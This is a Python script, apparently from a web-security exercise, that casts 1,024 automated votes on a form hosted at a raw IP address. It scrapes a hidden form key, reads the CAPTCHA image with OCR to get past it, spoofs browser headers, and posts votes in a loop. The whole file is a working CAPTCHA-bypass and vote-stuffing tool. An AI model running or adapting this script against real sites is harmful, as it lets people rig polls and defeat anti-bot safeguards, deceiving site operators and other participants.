#!/usr/bin/python3


"""this module will be used for voting 1024 times
    at the website provided"""
import urllib
from bs4 import BeautifulSoup
import requests
import pytesseract
from io import BytesIO
try:
    import Image
except ImportError:
    from PIL import Image

def get_captcha(req_session, url):
    """pulls captcha value from url that points to an image
    """
    req = req_session.get(url)
    img = Image.open(BytesIO(req.content))
    return pytesseract.image_to_string(img)

def do_post_crack():
    base_url = "http://158.69.76.135"
    captcha = base_url + "/captcha.php"
    url = base_url + "/level3.php"
    hs = { 'Referer': url,
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0'} 

    session = requests.session()
    get_key_r = session.get(url, headers=hs)
    content = get_key_r.content
    soup = BeautifulSoup(content, 'html.parser')
    inputs = soup.find_all('input')
    for line in inputs:
        if line.get('name') == "key":
            key = line.get('value')
    captcha_val = get_captcha(session, captcha)

    payload = {'id': '496', 'key': key, 'holdthedoor': 'submit',
                'captcha': captcha_val}

    r = session.post(url, headers=hs, data=payload)
    status_code = r.status_code
    del session
    
    if status_code != 200:
        return False
    return True

failed = 0
num_req = 1024
i = 0
while i < num_req:
    if failed > 10:
        break
    res = do_post_crack()
    if res == False:
        print("failed to post {}th request".format(i))
        failed += 1
        num_req += 1
    if i % 10 == 0:
        print("posted {} requests to server".format(i))
    i += 1
print("Failed {} number of requests, succeeded with {} requests".format(failed, i))
